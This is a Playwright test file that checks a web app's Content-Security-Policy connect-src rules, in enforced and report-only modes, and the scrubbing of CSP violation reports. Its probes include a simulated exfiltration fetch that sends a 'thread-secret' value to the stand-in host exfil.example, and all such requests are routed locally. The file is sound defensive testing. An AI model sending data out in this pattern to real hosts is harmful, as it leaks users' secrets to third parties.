import { createServer, type Server } from 'node:http';
import { type AddressInfo } from 'node:net';

import { expect, test, type Page } from '@playwright/test';

import { parseCspReports } from '../../src/utils/cspReport';
import {
  connectSources,
  connectSrcReportOnly,
  type CspEnv,
} from '../../src/lib/csp';

/**
 * GOO-729: the explicit connect-src list from src/lib/csp.ts.
 *  - Enforced (what a follow-up will ship): API fetch, Supabase auth and an
 *    XHR upload still work; an unlisted host is blocked before any request
 *    leaves the page.
 * WebSockets are not probed here: a Playwright-routed WebSocket connects even
 * under `connect-src 'self'` (checked against Chromium), so it cannot show
 * CSP behavior. The WebSocket origin is covered by csp.connect.test.ts.
 *  - Report-only (what ships now): the unlisted request still goes through,
 *    and the browser raises a report-disposition violation for it.
 */
const host = 'https://csp-connect.test';
const env: CspEnv = {
  NODE_ENV: 'production',
  NEXT_PUBLIC_API_URL: 'https://api.csp-connect.test/api/v1',
  NEXT_PUBLIC_SUPABASE_URL: 'https://auth.csp-connect.test',
  NEXT_PUBLIC_SENTRY_DSN: 'https://k@o1.ingest.sentry.example/42',
};
const pageUrl = new URL(`${host}/chat`);

async function serve(
  page: Page,
  headers: Record<string, string>
): Promise<string[]> {
  const thirdParty: string[] = [];
  await page.route('https://exfil.example/**', (route) => {
    thirdParty.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await page.route('https://api.csp-connect.test/**', (route) =>
    route.fulfill({ json: { ok: true } })
  );
  await page.route('https://auth.csp-connect.test/**', (route) =>
    route.fulfill({ json: { user: null } })
  );
  await page.route(`${host}/**`, (route) =>
    route.fulfill({
      contentType: 'text/html',
      headers,
      body: `<!doctype html><body><script>
        window.violations = [];
        document.addEventListener('securitypolicyviolation', (e) =>
          window.violations.push({ uri: e.blockedURI, disposition: e.disposition }));
      </script></body>`,
    })
  );
  await page.goto(pageUrl.toString());
  return thirdParty;
}

type Probe = Record<'api' | 'auth' | 'upload' | 'exfil', 'ok' | 'blocked'>;

async function probe(page: Page): Promise<Probe> {
  return page.evaluate(async () => {
    const attempt = async (
      fn: () => Promise<unknown>
    ): Promise<'ok' | 'blocked'> => {
      try {
        await fn();
        return 'ok';
      } catch {
        return 'blocked';
      }
    };
    const upload = (): Promise<void> =>
      new Promise<void>((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open(
          'POST',
          'https://api.csp-connect.test/api/v1/documents/upload'
        );
        xhr.onload = () => resolve();
        xhr.onerror = () => reject(new Error('xhr'));
        xhr.send(new Blob(['pdf']));
      });
    return {
      api: await attempt(() =>
        fetch('https://api.csp-connect.test/api/v1/documents')
      ),
      auth: await attempt(() =>
        fetch('https://auth.csp-connect.test/auth/v1/user')
      ),
      upload: await attempt(upload),
      exfil: await attempt(() =>
        fetch('https://exfil.example/collect?d=thread-secret', {
          mode: 'no-cors',
        })
      ),
    };
  });
}

test('enforced: listed origins work, an unlisted host is blocked', async ({
  page,
}) => {
  const thirdParty = await serve(page, {
    'Content-Security-Policy': `connect-src ${connectSources(env, pageUrl).join(' ')}`,
  });
  expect(await probe(page)).toEqual({
    api: 'ok',
    auth: 'ok',
    upload: 'ok',
    exfil: 'blocked',
  });
  expect(thirdParty).toEqual([]);
});

test('report-only: an unlisted host is reported, not blocked', async ({
  page,
}) => {
  const thirdParty = await serve(page, {
    'Content-Security-Policy-Report-Only': connectSrcReportOnly(env, pageUrl),
  });
  expect(await probe(page)).toEqual({
    api: 'ok',
    auth: 'ok',
    upload: 'ok',
    exfil: 'ok',
  });
  expect(thirdParty).toHaveLength(1);
  const violations = await page.evaluate(
    () =>
      (
        window as unknown as {
          violations: { uri: string; disposition: string }[];
        }
      ).violations
  );
  // Only the unlisted host is reported, and only as a report.
  expect(violations.length).toBeGreaterThan(0);
  for (const violation of violations) {
    expect(violation.disposition).toBe('report');
    expect(new URL(violation.uri).host).toBe('exfil.example');
  }
});

/**
 * Playwright cannot see report uploads (they leave the browser outside any
 * frame), so this test serves the page from a real local server that also
 * receives the reports.
 *
 * It checks the report-uri leg (Firefox, Safari). With both directives
 * Chromium uses report-to only and batches delivery; headless Chromium did
 * not deliver a report-to batch within 120 s here, so report-to is removed
 * for this test. The reports+json shape is covered by cspReport.test.ts and
 * by the post-deploy checks in the PR.
 */
test('report-only: the browser posts reports to the same-origin route, not to Sentry', async ({
  page,
}) => {
  const received: { type: string; body: string }[] = [];
  const server: Server = createServer((request, response) => {
    if (request.method === 'POST' && request.url === '/api/csp-report') {
      let body = '';
      request.on('data', (chunk: Buffer) => (body += chunk.toString()));
      request.on('end', () => {
        received.push({ type: request.headers['content-type'] ?? '', body });
        response.writeHead(204).end();
      });
      return;
    }
    const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const url = new URL(request.url ?? '/', origin);
    response.writeHead(200, {
      'content-type': 'text/html',
      'Content-Security-Policy-Report-Only': connectSrcReportOnly(
        env,
        url
      ).replace(/; report-to [^;]+/, ''),
    });
    response.end('<!doctype html><body></body>');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const sentryDirect: string[] = [];
  await page.route('https://o1.ingest.sentry.example/**', (route) => {
    sentryDirect.push(route.request().url());
    return route.fulfill({ status: 200 });
  });
  await page.route('https://exfil.example/**', (route) =>
    route.fulfill({ status: 204 })
  );
  try {
    const port = (server.address() as AddressInfo).port;
    await page.goto(
      `http://127.0.0.1:${port}/auth/callback?code=pkce-code-123`
    );
    await page.evaluate(() =>
      fetch('https://exfil.example/collect?d=thread-secret', {
        mode: 'no-cors',
      }).catch(() => undefined)
    );
    await expect
      .poll(() => received.length, { timeout: 15_000 })
      .toBeGreaterThan(0);
    // What the browser sends is raw; the route's scrubber reduces it.
    const scrubbed = received.flatMap(
      (r) => parseCspReports(r.type, r.body, `http://127.0.0.1:${port}`).reports
    );
    expect(scrubbed).toContainEqual(
      expect.objectContaining({
        directive: 'connect-src',
        blocked: 'https://exfil.example',
        documentRoute: '/auth',
      })
    );
    expect(JSON.stringify(scrubbed)).not.toMatch(/pkce-code-123|thread-secret/);
    expect(sentryDirect).toEqual([]);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});
